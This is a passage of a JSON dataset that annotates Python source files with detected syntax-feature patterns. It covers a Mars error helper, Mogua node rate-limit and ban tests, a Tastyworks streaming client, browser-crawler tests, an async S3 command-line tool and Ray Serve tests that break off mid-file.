                        "async def redirect_subtask_errors(actor: mo.Actor, subtasks):\n    try:\n        yield\n    except:  \n        _, error, traceback = sys.exc_info()\n        status = (\n            SubtaskStatus.cancelled\n            if isinstance(error, asyncio.CancelledError)\n            else SubtaskStatus.errored\n        )\n        task_api = await _get_task_api(actor)\n        coros = []\n        for subtask in subtasks:\n            if subtask is None:  \n                continue\n            coros.append(\n                task_api.set_subtask_result(\n                    SubtaskResult(\n                        subtask_id=subtask.subtask_id,\n                        session_id=subtask.session_id,\n                        task_id=subtask.task_id,\n                        progress=1.0,\n                        status=status,\n                        error=error,\n                        traceback=traceback,\n                    )\n                )\n            )\n        await asyncio.wait(coros)\n        raise"
                    ]
                ]
            }
        },
        "62": {
            "file": "import asyncio\nimport logging\nimport pytest\nfrom aiohttp import ClientSession, ClientTimeout, ServerDisconnectedError, WSCloseCode, WSMessage, WSMsgType\nfrom mogua.full_node.full_node_api import FullNodeAPI\nfrom mogua.protocols import full_node_protocol\nfrom mogua.protocols.protocol_message_types import ProtocolMessageTypes\nfrom mogua.server.outbound_message import make_msg\nfrom mogua.server.rate_limits import RateLimiter\nfrom mogua.server.server import ssl_context_for_client\nfrom mogua.server.ws_connection import WSMoguaConnection\nfrom mogua.types.peer_info import PeerInfo\nfrom mogua.util.ints import uint16, uint64\nfrom tests.setup_nodes import self_hostname, setup_simulators_and_wallets\nfrom tests.time_out_assert import time_out_assert\nlog = logging.getLogger(__name__)\nasync def get_block_path(full_node: FullNodeAPI):\n    blocks_list = [await full_node.full_node.blockchain.get_full_peak()]\n    assert blocks_list[0] is not None\n    while blocks_list[0].height != 0:\n        b = await full_node.full_node.block_store.get_full_block(blocks_list[0].prev_header_hash)\n        assert b is not None\n        blocks_list.insert(0, b)\n    return blocks_list\n@pytest.fixture(scope=\"session\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n@pytest.fixture(scope=\"function\")\nasync def setup_two_nodes():\n    async for _ in setup_simulators_and_wallets(2, 0, {}, starting_port=60000):\n        yield _\nclass FakeRateLimiter:\n    def process_msg_and_check(self, msg):\n        return True\nclass TestDos:\n    @pytest.mark.asyncio\n    async def test_large_message_disconnect_and_ban(self, setup_two_nodes):\n        nodes, _ = setup_two_nodes\n        server_1 = nodes[0].full_node.server\n        server_2 = nodes[1].full_node.server\n        timeout = ClientTimeout(total=10)\n        session = ClientSession(timeout=timeout)\n        url = f\"wss://{self_hostname}:{server_1._port}/ws\"\n        ssl_context = ssl_context_for_client(\n            server_2.mogua_ca_crt_path, server_2.mogua_ca_key_path, server_2.p2p_crt_path, server_2.p2p_key_path\n        )\n        ws = await session.ws_connect(\n            url, autoclose=True, autoping=True, heartbeat=60, ssl=ssl_context, max_msg_size=100 * 1024 * 1024\n        )\n        assert not ws.closed\n        await ws.close()\n        assert ws.closed\n        ws = await session.ws_connect(\n            url, autoclose=True, autoping=True, heartbeat=60, ssl=ssl_context, max_msg_size=100 * 1024 * 1024\n        )\n        assert not ws.closed\n        large_msg: bytes = bytes([0] * (60 * 1024 * 1024))\n        await ws.send_bytes(large_msg)\n        response: WSMessage = await ws.receive()\n        print(response)\n        assert response.type == WSMsgType.CLOSE\n        assert response.data == WSCloseCode.MESSAGE_TOO_BIG\n        await ws.close()\n        await asyncio.sleep(5)\n        assert ws.closed\n        try:\n            ws = await session.ws_connect(\n                url, autoclose=True, autoping=True, heartbeat=60, ssl=ssl_context, max_msg_size=100 * 1024 * 1024\n            )\n            response: WSMessage = await ws.receive()\n            assert response.type == WSMsgType.CLOSE\n        except ServerDisconnectedError:\n            pass\n        await session.close()\n    @pytest.mark.asyncio\n    async def test_bad_handshake_and_ban(self, setup_two_nodes):\n        nodes, _ = setup_two_nodes\n        server_1 = nodes[0].full_node.server\n        server_2 = nodes[1].full_node.server\n        server_1.invalid_protocol_ban_seconds = 10\n        timeout = ClientTimeout(total=10)\n        session = ClientSession(timeout=timeout)\n        url = f\"wss://{self_hostname}:{server_1._port}/ws\"\n        ssl_context = ssl_context_for_client(\n            server_2.mogua_ca_crt_path, server_2.mogua_ca_key_path, server_2.p2p_crt_path, server_2.p2p_key_path\n        )\n        ws = await session.ws_connect(\n            url, autoclose=True, autoping=True, heartbeat=60, ssl=ssl_context, max_msg_size=100 * 1024 * 1024\n        )\n        await ws.send_bytes(bytes([1] * 1024))\n        response: WSMessage = await ws.receive()\n        print(response)\n        assert response.type == WSMsgType.CLOSE\n        assert response.data == WSCloseCode.PROTOCOL_ERROR\n        await ws.close()\n        await asyncio.sleep(5)\n        assert ws.closed\n        try:\n            ws = await session.ws_connect(\n                url, autoclose=True, autoping=True, heartbeat=60, ssl=ssl_context, max_msg_size=100 * 1024 * 1024\n            )\n            response: WSMessage = await ws.receive()\n            assert response.type == WSMsgType.CLOSE\n        except ServerDisconnectedError:\n            pass\n        await asyncio.sleep(6)\n        await session.ws_connect(\n            url, autoclose=True, autoping=True, heartbeat=60, ssl=ssl_context, max_msg_size=100 * 1024 * 1024\n        )\n        await session.close()\n    @pytest.mark.asyncio\n    async def test_spam_tx(self, setup_two_nodes):\n        nodes, _ = setup_two_nodes\n        full_node_1, full_node_2 = nodes\n        server_1 = nodes[0].full_node.server\n        server_2 = nodes[1].full_node.server\n        await server_2.start_client(PeerInfo(self_hostname, uint16(server_1._port)), full_node_2.full_node.on_connect)\n        assert len(server_1.all_connections) == 1\n        ws_con: WSMoguaConnection = list(server_1.all_connections.values())[0]\n        ws_con_2: WSMoguaConnection = list(server_2.all_connections.values())[0]\n        ws_con.peer_host = \"1.2.3.4\"\n        ws_con_2.peer_host = \"1.2.3.4\"\n        new_tx_message = make_msg(\n            ProtocolMessageTypes.new_transaction,\n            full_node_protocol.NewTransaction(bytes([9] * 32), uint64(0), uint64(0)),\n        )\n        for i in range(4000):\n            await ws_con._send_message(new_tx_message)\n        await asyncio.sleep(1)\n        assert not ws_con.closed\n        for i in range(2000):\n            await ws_con._send_message(new_tx_message)\n        await asyncio.sleep(1)\n        assert not ws_con.closed\n        ws_con.outbound_rate_limiter = RateLimiter(incoming=True, percentage_of_limit=10000)\n        for i in range(6000):\n            await ws_con._send_message(new_tx_message)\n        await asyncio.sleep(1)\n        def is_closed():\n            return ws_con.closed\n        await time_out_assert(15, is_closed)\n        assert ws_con.closed\n        def is_banned():\n            return \"1.2.3.4\" in server_2.banned_peers\n        await time_out_assert(15, is_banned)\n    @pytest.mark.asyncio\n    async def test_spam_message_non_tx(self, setup_two_nodes):\n        nodes, _ = setup_two_nodes\n        full_node_1, full_node_2 = nodes\n        server_1 = nodes[0].full_node.server\n        server_2 = nodes[1].full_node.server\n        await server_2.start_client(PeerInfo(self_hostname, uint16(server_1._port)), full_node_2.full_node.on_connect)\n        assert len(server_1.all_connections) == 1\n        ws_con: WSMoguaConnection = list(server_1.all_connections.values())[0]\n        ws_con_2: WSMoguaConnection = list(server_2.all_connections.values())[0]\n        ws_con.peer_host = \"1.2.3.4\"\n        ws_con_2.peer_host = \"1.2.3.4\"\n        def is_closed():\n            return ws_con.closed\n        new_message = make_msg(\n            ProtocolMessageTypes.request_mempool_transactions,\n            full_node_protocol.RequestMempoolTransactions(bytes([])),\n        )\n        for i in range(2):\n            await ws_con._send_message(new_message)\n        await asyncio.sleep(1)\n        assert not ws_con.closed\n        for i in range(10):\n            await ws_con._send_message(new_message)\n        await asyncio.sleep(1)\n        assert not ws_con.closed\n        ws_con.outbound_rate_limiter = RateLimiter(incoming=True, percentage_of_limit=10000)\n        for i in range(6):\n            await ws_con._send_message(new_message)\n        await time_out_assert(15, is_closed)\n        def is_banned():\n            return \"1.2.3.4\" in server_2.banned_peers\n        await time_out_assert(15, is_banned)\n    @pytest.mark.asyncio\n    async def test_spam_message_too_large(self, setup_two_nodes):\n        nodes, _ = setup_two_nodes\n        full_node_1, full_node_2 = nodes\n        server_1 = nodes[0].full_node.server\n        server_2 = nodes[1].full_node.server\n        await server_2.start_client(PeerInfo(self_hostname, uint16(server_1._port)), full_node_2.full_node.on_connect)\n        assert len(server_1.all_connections) == 1\n        ws_con: WSMoguaConnection = list(server_1.all_connections.values())[0]\n        ws_con_2: WSMoguaConnection = list(server_2.all_connections.values())[0]\n        ws_con.peer_host = \"1.2.3.4\"\n        ws_con_2.peer_host = \"1.2.3.4\"\n        def is_closed():\n            return ws_con.closed\n        new_message = make_msg(\n            ProtocolMessageTypes.request_mempool_transactions,\n            full_node_protocol.RequestMempoolTransactions(bytes([0] * 5 * 1024 * 1024)),\n        )\n        await ws_con._send_message(new_message)\n        await asyncio.sleep(1)\n        assert not ws_con.closed\n        ws_con.outbound_rate_limiter = FakeRateLimiter()\n        await ws_con._send_message(new_message)\n        await time_out_assert(15, is_closed)\n        def is_banned():\n            return \"1.2.3.4\" in server_2.banned_peers\n        await time_out_assert(15, is_banned)",
            "patterns": {
                "pep_526": [
                    [
                        58,
                        "large_msg: bytes = bytes([0] * (60 * 1024 * 1024))"
                    ],
                    [
                        60,
                        "response: WSMessage = await ws.receive()"
                    ],
                    [
                        92,
                        "response: WSMessage = await ws.receive()"
                    ],
                    [
                        120,
                        "ws_con: WSMoguaConnection = list(server_1.all_connections.values())[0]"
                    ],
                    [
                        121,
                        "ws_con_2: WSMoguaConnection = list(server_2.all_connections.values())[0]"
                    ],
                    [
                        155,
                        "ws_con: WSMoguaConnection = list(server_1.all_connections.values())[0]"
                    ],
                    [
                        156,
                        "ws_con_2: WSMoguaConnection = list(server_2.all_connections.values())[0]"
                    ],
                    [
                        188,
                        "ws_con: WSMoguaConnection = list(server_1.all_connections.values())[0]"
                    ],
                    [
                        189,
                        "ws_con_2: WSMoguaConnection = list(server_2.all_connections.values())[0]"
                    ],
                    [
                        71,
                        "response: WSMessage = await ws.receive()"
                    ],
                    [
                        103,
                        "response: WSMessage = await ws.receive()"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        30,
                        32,
                        "async generator",
                        "async def setup_two_nodes():\n    async for _ in setup_simulators_and_wallets(2, 0, {}, starting_port=60000):\n        yield _"
                    ],
                    [
                        31,
                        32,
                        "async for",
                        "async for _ in setup_simulators_and_wallets(2, 0, {}, starting_port=60000):\n        yield _"
                    ]
                ],
                "pep_498": [
                    [
                        44,
                        "        url = f\"wss://{self_hostname}:{server_1._port}/ws\""
                    ],
                    [
                        84,
                        "        url = f\"wss://{self_hostname}:{server_1._port}/ws\""
                    ]
                ]
            }
        },
        "63": {
            "file": "import asyncio\nimport datetime\nimport logging\nimport aiocometd\nimport requests\nfrom aiocometd import ConnectionType\nfrom tastyworks import dxfeed\nfrom tastyworks.dxfeed import mapper as dxfeed_mapper\nfrom tastyworks.models.session import TastyAPISession\nLOGGER = logging.getLogger(__name__)\nclass DataStreamer(object):\n    def __init__(self, session: TastyAPISession):\n        if not session.is_active():\n            raise Exception('TastyWorks API session not active/valid')\n        self.tasty_session = session\n        self.cometd_client = None\n        self.subs = {}\n        asyncio.get_event_loop().run_until_complete(\n            self._setup_connection()\n        )\n    def __del__(self):\n        asyncio.get_event_loop().run_until_complete(\n            self.cometd_client.close()\n        )\n    async def _cometd_close(self):\n        await self.cometd_client.close()\n    async def add_data_sub(self, values):\n        LOGGER.debug(f'Adding subscription: {values}')\n        await self._send_msg(dxfeed.SUBSCRIPTION_CHANNEL, {'add': values})\n    async def remove_data_sub(self, values):\n        LOGGER.info(f'Removing subscription: {values}')\n        await self._send_msg(dxfeed.SUBSCRIPTION_CHANNEL, {'remove': values})\n    async def _consumer(self, message):\n        return dxfeed_mapper.map_message(message)\n    async def _send_msg(self, channel, message):\n        if not self.logged_in:\n            raise Exception('Connection not made or logged in')\n        LOGGER.debug('[dxFeed] sending: %s on channel: %s', message, channel)\n        await self.cometd_client.publish(channel, message)\n    async def reset_data_subs(self):\n        LOGGER.debug('Resetting data subscriptions')\n        await self._send_msg(dxfeed.SUBSCRIPTION_CHANNEL, {'reset': True})\n    def get_streamer_token(self):\n        return self._get_streamer_data()['data']['token']\n    def _get_streamer_data(self):\n        if not self.tasty_session.logged_in:\n            raise Exception('Logged in session required')\n        if hasattr(self, 'streamer_data_created') and (datetime.datetime.now() - self.streamer_data_created).total_seconds() < 60:\n            return self.streamer_data\n        resp = requests.get(f'{self.tasty_session.API_url}/quote-streamer-tokens', headers=self.tasty_session.get_request_headers())\n        if resp.status_code != 200:\n            raise Exception('Could not get quote streamer data, error message: {}'.format(\n                resp.json()['error']['message']\n            ))\n        self.streamer_data = resp.json()\n        self.streamer_data_created = datetime.datetime.now()\n        return resp.json()\n    def _get_streamer_websocket_url(self):\n        socket_url = self._get_streamer_data()['data']['websocket-url']\n        full_url = '{}/cometd'.format(socket_url)\n        return full_url\n    async def _setup_connection(self):\n        aiocometd.client.DEFAULT_CONNECTION_TYPE = ConnectionType.WEBSOCKET\n        streamer_url = self._get_streamer_websocket_url()\n        LOGGER.info('Connecting to url: %s', streamer_url)\n        auth_extension = AuthExtension(self.get_streamer_token())\n        cometd_client = aiocometd.Client(\n            streamer_url,\n            auth=auth_extension,\n        )\n        await cometd_client.open()\n        await cometd_client.subscribe(dxfeed.DATA_CHANNEL)\n        self.cometd_client = cometd_client\n        self.logged_in = True\n        LOGGER.info('Connected and logged in to dxFeed data stream')\n        await self.reset_data_subs()\n    async def listen(self):\n        async for msg in self.cometd_client:\n            LOGGER.debug('[dxFeed] received: %s', msg)\n            if msg['channel'] != dxfeed.DATA_CHANNEL:\n                continue\n            yield await self._consumer(msg['data'])\n    async def add_timeseries_sub(self, values):\n        LOGGER.debug(f'Adding timeseries subscription: {values}')\n        message = [\n            {\n                'channel': '/service/sub',\n                'clientId': self.client_id,\n                'id': self._get_nonce(),\n                'data': {\n                    'addTimeSeries': values\n                }\n            }\n        ]\n        await self._send_msg(message)\nclass AuthExtension(aiocometd.AuthExtension):\n    def __init__(self, streamer_token: str):\n        self.streamer_token = streamer_token\n    def _get_login_msg(self):\n        return {'ext': {'com.devexperts.auth.AuthToken': f'{self.streamer_token}'}}\n    def _get_advice_msg(self):\n        return {\n            'timeout': 60 * 1000,\n            'interval': 0\n        }\n    async def incoming(self, payload, headers=None):\n        pass\n    async def outgoing(self, payload, headers=None):\n        for entry in payload:\n            if 'clientId' not in entry:\n                entry.update(self._get_login_msg())\n    async def authenticate(self):\n        pass",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        77,
                        82,
                        "async generator",
                        "async def listen(self):\n        async for msg in self.cometd_client:\n            LOGGER.debug('[dxFeed] received: %s', msg)\n            if msg['channel'] != dxfeed.DATA_CHANNEL:\n                continue\n            yield await self._consumer(msg['data'])"
                    ],
                    [
                        78,
                        82,
                        "async for",
                        "async for msg in self.cometd_client:\n            LOGGER.debug('[dxFeed] received: %s', msg)\n            if msg['channel'] != dxfeed.DATA_CHANNEL:\n                continue\n            yield await self._consumer(msg['data'])"
                    ]
                ],
                "pep_498v": [
                    [
                        60,
                        60,
                        ".format()"
                    ],
                    [
                        52,
                        54,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        28,
                        "        LOGGER.debug(f'Adding subscription: {values}')"
                    ],
                    [
                        31,
                        "        LOGGER.info(f'Removing subscription: {values}')"
                    ],
                    [
                        50,
                        "        resp = requests.get(f'{self.tasty_session.API_url}/quote-streamer-tokens', headers=self.tasty_session.get_request_headers())"
                    ],
                    [
                        84,
                        "        LOGGER.debug(f'Adding timeseries subscription: {values}')"
                    ],
                    [
                        100,
                        "        return {'ext': {'com.devexperts.auth.AuthToken': f'{self.streamer_token}'}}"
                    ]
                ]
            }
        },
        "64": {
            "file": "from crawler_cluster.browser_worker import BrowserWorker\nfrom lxml.html import HtmlElement\nimport pytest\nimport pytest_asyncio\nfrom pathlib import Path\nimport asyncio\nimport json\nstatic_dir = Path(__file__).parent.absolute().joinpath('static')\nantibot_url = f\"file:///{static_dir.joinpath('Antibot.html')}\"\ninteractions_url = f\"file:///{static_dir.joinpath('interactions.html')}\"\nblocked_url = f\"file:///{static_dir.joinpath('blocked.html')}\"\npytestmark = pytest.mark.asyncio\n@pytest.fixture\nasync def worker():\n    worker = BrowserWorker(disable_images=True, garbage_collect_at=500, launch_options={\n                           'ignoreDefaultArgs': '--disable-extensions'})\n    ok = await worker.launch()\n    assert ok\n    yield worker\n    await worker.shutdown()\nasync def test_fingerprint(worker):\n    await worker.try_get(antibot_url)\n    await worker.page.screenshot(path='browser_fingerprint.png', fullPage=True)\nasync def test_page_content(worker):\n    resp = await worker.try_get(antibot_url)\n    assert resp.status == 0\n    assert isinstance(worker.html, str)\n    assert isinstance(worker.text, str)\n    assert isinstance(worker.root, HtmlElement)\nasync def test_cookies(worker):\n    cookie = {'name': 'cookie', 'value': 'chocolate chip',\n              'domain': 'cookie.com', 'secure': False, 'sameSite': 'Lax'}\n    ok = await worker.set_cookie(cookie)\n    assert ok\n    ok = await worker.clear_cookies()\n    assert ok\n    cookies = await worker.page.cookies()\n    assert len(cookies) == 0\nasync def test_cdp(worker):\n    ok = worker.set_default_nav_timeout(60_000)\n    assert ok\n    ok = await worker.set_ad_block(True)\n    assert ok\nasync def test_blocked_urls(worker):\n    ok = await worker.set_blocked_urls(['saved_resource'])\n    await worker.try_get(antibot_url)\n    content = await worker.evaluate(\n        '() => JSON.stringify(performance.getEntries(), null, \"  \")')\n    names = [d.get('name') for d in json.loads(content)]\n    assert not any('saved_resource' in name for name in names)\nasync def test_request_abort_types(worker):\n    no_load = ['image', 'font', 'stylesheet', 'script', 'img']\n    ok = await worker.set_request_abort_types(no_load)\n    assert ok\nasync def test_disable_images(worker):\n    await worker.try_get(antibot_url)\n    content = await worker.evaluate('() => JSON.stringify(performance.getEntries(), null, \"  \")')\n    images = [d for d in json.loads(\n        content) if d.get('initiatorType') in ('image', 'img')]\n    assert len(images) == 0\nasync def test_evaluate_on_new_doc(worker):\n    ok = await worker.evaluate_on_new_doc(\"() => document.getElementById('title').setAttribute('id', 'awesome');\")\n    assert ok\nasync def test_redirect_block(worker):\n    ok = await worker.set_redirect_blocking_enabled(True)\n    assert ok\n    await worker.try_get(f\"file:///{static_dir.joinpath('redirect_from.html')}\")\n    assert 'redirect_to' not in worker.page.url\nasync def test_scroll(worker):\n    await worker.try_get(antibot_url)\n    ok = await worker.scroll()\n    assert ok\nasync def test_hover(worker):\n    await worker.try_get(interactions_url)\n    ok = await worker.hover('//th[@onmouseover]')\n    assert ok\nasync def test_click_js_element(worker):\n    await worker.try_get(interactions_url)\n    ok = await worker.click_js_element('//table[@onclick]')\n    assert ok\nasync def test_error_status(worker):\n    await worker._record_error_status(True)\n    await worker._record_error_status(True)\n    await worker._record_error_status(True)\n    await worker._record_error_status(True)\n    await worker._record_error_status(True)\n    assert not worker.ok\nasync def test_function_wait(worker):\n    async def sleep_long(sleep_time):\n        await asyncio.sleep(sleep_time)\n        return 0\n    ok, result = await worker._wait_for(sleep_long, wait_for_timeout=3, sleep_time=4)\n    assert not ok\n    assert result is None\n    assert worker._consecutive_errors == 1\nasync def test_block_detection(worker):\n    await worker.try_get(blocked_url)\n    assert worker.probability_blocked == 3",
            "patterns": {
                "pep_567": [
                    [
                        6,
                        6,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        14,
                        20,
                        "async generator",
                        "async def worker():\n    worker = BrowserWorker(disable_images=True, garbage_collect_at=500, launch_options={\n                           'ignoreDefaultArgs': '--disable-extensions'})\n    ok = await worker.launch()\n    assert ok\n    yield worker\n    await worker.shutdown()"
                    ]
                ],
                "pep_515": [
                    [
                        40,
                        "    ok = worker.set_default_nav_timeout(60_000)"
                    ]
                ],
                "pep_498": [
                    [
                        9,
                        "antibot_url = f\"file:///{static_dir.joinpath('Antibot.html')}\""
                    ],
                    [
                        10,
                        "interactions_url = f\"file:///{static_dir.joinpath('interactions.html')}\""
                    ],
                    [
                        11,
                        "blocked_url = f\"file:///{static_dir.joinpath('blocked.html')}\""
                    ],
                    [
                        67,
                        "    await worker.try_get(f\"file:///{static_dir.joinpath('redirect_from.html')}\")"
                    ]
                ]
            }
        },
        "65": {
            "file": "import asyncio\nimport aiobotocore\nimport click\nimport os\nimport sys\nfrom botocore.exceptions import ClientError\nC_DOWNLOAD = \"download\"\nC_GET = \"get\"\nC_LIST = \"list\"\nC_UPLOAD = \"upload\"\ncommands = [C_DOWNLOAD, C_GET, C_LIST, C_UPLOAD]\nstorage_url = 'http://localhost:9000'\nconcurrency = 10\ndef error_handler(f):\n    async def wrapper(*args, **kwargs):\n        try:\n            return await f(*args, **kwargs)\n        except Exception as e:\n            sys.exit(str(e))\n    return wrapper\ndef handle_one_error(loop, context):\n    msg = context.get(\"exception\", context[\"message\"])\n    sys.stderr.write(f\"Caught exception: {msg}\\n\")\nasync def upload_one_file(src, dest, bucket, client, sem=asyncio.Semaphore(1)):\n    async with sem:\n        resp = await client.put_object(Bucket=bucket, Key=dest, Body=open(src, \"rb\"))\n        print(\"{} uploaded\".format(src))\nasync def download_one_file(src, dest, bucket, client, sem=asyncio.Semaphore(1)):\n    async with sem:\n        resp = await client.get_object(Bucket=bucket, Key=src)\n        async with resp[\"Body\"] as stream:\n            out_file_name = os.path.join(dest, os.path.basename(src))\n            with open(out_file_name, \"wb\") as out_file:\n                while True:\n                    data = await stream.read(1024)\n                    if len(data) == 0:\n                        break\n                    out_file.write(data)\n            print(\"{} downloaded to {}\".format(src, out_file_name))\nasync def list_bucket(bucket, client):\n    continuation_token = ''\n    while True:\n        resp = await client.list_objects(Bucket=bucket, Marker=continuation_token)\n        for obj in resp[\"Contents\"]:\n            owner_name = obj[\"Owner\"][\"DisplayName\"]\n            owner_name = \"unknown\" if len(owner_name) == 0 else owner_name\n            owner_id = obj[\"Owner\"][\"ID\"]\n            dt = obj[\"LastModified\"]\n            key = obj[\"Key\"]\n            yield (owner_name, owner_id, dt.strftime(\"%Y-%m-%d %H:%M:%S %Z\"), key)\n        if not resp.get(\"IsTruncated\"):\n            break\n        continuation_token = resp.get('NextMarker')\nasync def print_bucket(bucket, client):\n    async for owner_name, owner_id, sdt, key in list_bucket(bucket, client):\n        print(\"{} {} {} {}\".format(owner_name, owner_id, sdt, key))\nasync def download_bucket(bucket, client):\n    download_tasks = list()\n    sem = asyncio.Semaphore(concurrency)\n    conum = 0\n    async for _, _, _, key in list_bucket(bucket, client):\n        conum += 1\n        directories = [bucket]\n        outdir = \"\"\n        path = key.split(\"/\")\n        directories.extend(path[:-1])\n        for directory in directories:\n            outdir = os.path.join(outdir, directory)\n            if not os.path.exists(outdir):\n                os.mkdir(outdir)\n        download_tasks.append(asyncio.ensure_future(download_one_file(key, outdir, bucket, client, sem)))\n        if conum == concurrency:\n            await asyncio.wait(download_tasks)\n            download_tasks.clear()\n            conum = 0\n    if len(download_tasks) != 0:\n        await asyncio.wait(download_tasks)\nasync def upload(src, bucket, client):\n    sem = asyncio.Semaphore(concurrency)\n    upload_tasks = list()\n    src_full = os.path.abspath(src)\n    one_level_upper = os.path.abspath(os.path.join(src_full, \"../\"))\n    conum = 0\n    for path, dirs, files in os.walk(src_full):\n        key = path[len(one_level_upper) + 1:]\n        for file in files:\n            conum += 1\n            in_file_name = os.path.join(path, file)\n            out_file_name = os.path.join(key, file)\n            upload_tasks.append(asyncio.ensure_future(upload_one_file(in_file_name, out_file_name, bucket, client, sem)))\n            if conum == concurrency:\n                await asyncio.wait(upload_tasks)\n                upload_tasks.clear()\n                conum = 0\n    if len(upload_tasks) > 0:\n        await asyncio.wait(upload_tasks)\n@error_handler\nasync def async_main(login, password, command, src, dest, bucket, loop):\n    session = aiobotocore.get_session(loop=loop)\n    async with session.create_client(\"s3\",\n                                     endpoint_url=storage_url,\n                                     region_name='us-west-2',\n                                     aws_secret_access_key=password,\n                                     aws_access_key_id=login) as client:\n        if command == C_DOWNLOAD:\n            await download_bucket(bucket, client)\n        elif command == C_GET:\n            await download_one_file(src, dest, bucket, client)\n        elif command == C_LIST:\n            await print_bucket(bucket, client)\n        elif command == C_UPLOAD:\n            await upload(src, bucket, client)\n        else:\n            sys.exit(\"Unknown command {}\".format(command))\n@click.command()\n@click.option(\"--login\", \"-l\", default=\"\", help=\"Access key\")\n@click.option(\"--password\", \"-p\", default=\"\", help=\"Secret key\")\n@click.option(\"--command\", \"-c\", default=\"list\", help=\"commands: {}\".format(\", \".join(map(str, commands))))\n@click.option(\"--src\", \"-s\", default=\".\", help=\"/path/to/source\")\n@click.option(\"--dest\", \"-d\", default=\".\", help=\"/path/to/dest\")\n@click.option(\"--bucket\", \"-b\", default=\"mybucket\", help=\"bucket name\")\ndef main(login, password, command, src, dest, bucket):\n    loop = asyncio.get_event_loop()\n    loop.set_exception_handler(handle_one_error)\n    loop.run_until_complete(async_main(login, password, command, src, dest, bucket, loop))\nif __name__ == \"__main__\":\n    main()",
            "patterns": {
                "pep_468": [
                    [
                        17,
                        "f(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        40,
                        53,
                        "async generator",
                        "async def list_bucket(bucket, client):\n    continuation_token = ''\n    while True:\n        resp = await client.list_objects(Bucket=bucket, Marker=continuation_token)\n        for obj in resp[\"Contents\"]:\n            owner_name = obj[\"Owner\"][\"DisplayName\"]\n            owner_name = \"unknown\" if len(owner_name) == 0 else owner_name\n            owner_id = obj[\"Owner\"][\"ID\"]\n            dt = obj[\"LastModified\"]\n            key = obj[\"Key\"]\n            yield (owner_name, owner_id, dt.strftime(\"%Y-%m-%d %H:%M:%S %Z\"), key)\n        if not resp.get(\"IsTruncated\"):\n            break\n        continuation_token = resp.get('NextMarker')"
                    ],
                    [
                        55,
                        56,
                        "async for",
                        "async for owner_name, owner_id, sdt, key in list_bucket(bucket, client):\n        print(\"{} {} {} {}\".format(owner_name, owner_id, sdt, key))"
                    ],
                    [
                        61,
                        75,
                        "async for",
                        "async for _, _, _, key in list_bucket(bucket, client):\n        conum += 1\n        directories = [bucket]\n        outdir = \"\"\n        path = key.split(\"/\")\n        directories.extend(path[:-1])\n        for directory in directories:\n            outdir = os.path.join(outdir, directory)\n            if not os.path.exists(outdir):\n                os.mkdir(outdir)\n        download_tasks.append(asyncio.ensure_future(download_one_file(key, outdir, bucket, client, sem)))\n        if conum == concurrency:\n            await asyncio.wait(download_tasks)\n            download_tasks.clear()\n            conum = 0"
                    ]
                ],
                "pep_498v": [
                    [
                        118,
                        118,
                        ".format()"
                    ],
                    [
                        27,
                        27,
                        ".format()"
                    ],
                    [
                        56,
                        56,
                        ".format()"
                    ],
                    [
                        39,
                        39,
                        ".format()"
                    ],
                    [
                        114,
                        114,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        23,
                        "    sys.stderr.write(f\"Caught exception: {msg}\\n\")"
                    ]
                ]
            }
        },
        "66": {
            "file": "import asyncio\nimport time\nimport os\nimport requests\nimport pytest\nimport starlette.responses\nimport ray\nfrom ray import serve\nfrom ray.test_utils import wait_for_condition\nfrom ray.serve.config import BackendConfig\ndef test_e2e(serve_instance):\n    @serve.deployment(name=\"api\")\n    def function(starlette_request):\n        return {\"method\": starlette_request.method}\n    function.deploy()\n    resp = requests.get(\"http://127.0.0.1:8000/api\").json()[\"method\"]\n    assert resp == \"GET\"\n    resp = requests.post(\"http://127.0.0.1:8000/api\").json()[\"method\"]\n    assert resp == \"POST\"\ndef test_starlette_response(serve_instance):\n    @serve.deployment(name=\"basic\")\n    def basic(_):\n        return starlette.responses.Response(\n            \"Hello, world!\", media_type=\"text/plain\")\n    basic.deploy()\n    assert requests.get(\"http://127.0.0.1:8000/basic\").text == \"Hello, world!\"\n    @serve.deployment(name=\"html\")\n    def html(_):\n        return starlette.responses.HTMLResponse(\n            \"<html><body><h1>Hello, world!</h1></body></html>\")\n    html.deploy()\n    assert requests.get(\n        \"http://127.0.0.1:8000/html\"\n    ).text == \"<html><body><h1>Hello, world!</h1></body></html>\"\n    @serve.deployment(name=\"plain_text\")\n    def plain_text(_):\n        return starlette.responses.PlainTextResponse(\"Hello, world!\")\n    plain_text.deploy()\n    assert requests.get(\n        \"http://127.0.0.1:8000/plain_text\").text == \"Hello, world!\"\n    @serve.deployment(name=\"json\")\n    def json(_):\n        return starlette.responses.JSONResponse({\"hello\": \"world\"})\n    json.deploy()\n    assert requests.get(\"http://127.0.0.1:8000/json\").json()[\n        \"hello\"] == \"world\"\n    @serve.deployment(name=\"redirect\")\n    def redirect(_):\n        return starlette.responses.RedirectResponse(\n            url=\"http://127.0.0.1:8000/basic\")\n    redirect.deploy()\n    assert requests.get(\n        \"http://127.0.0.1:8000/redirect\").text == \"Hello, world!\"\n    @serve.deployment(name=\"streaming\")\n    def streaming(_):\n        async def slow_numbers():\n            for number in range(1, 4):\n                yield str(number)\n                await asyncio.sleep(0.01)\n        return starlette.responses.StreamingResponse(\n            slow_numbers(), media_type=\"text/plain\", status_code=418)\n    streaming.deploy()\n    resp = requests.get(\"http://127.0.0.1:8000/streaming\")\n    assert resp.text == \"123\"\n    assert resp.status_code == 418\ndef test_backend_user_config(serve_instance):\n    @serve.deployment(\n        \"counter\", num_replicas=2, user_config={\n            \"count\": 123,\n            \"b\": 2\n        })\n    class Counter:\n        def __init__(self):\n            self.count = 10\n        def __call__(self, starlette_request):\n            return self.count, os.getpid()\n        def reconfigure(self, config):\n            self.count = config[\"count\"]\n    Counter.deploy()\n    handle = Counter.get_handle()\n    def check(val, num_replicas):\n        pids_seen = set()\n        for i in range(100):\n            result = ray.get(handle.remote())\n            if str(result[0]) != val:\n                return False\n            pids_seen.add(result[1])\n        return len(pids_seen) == num_replicas\n    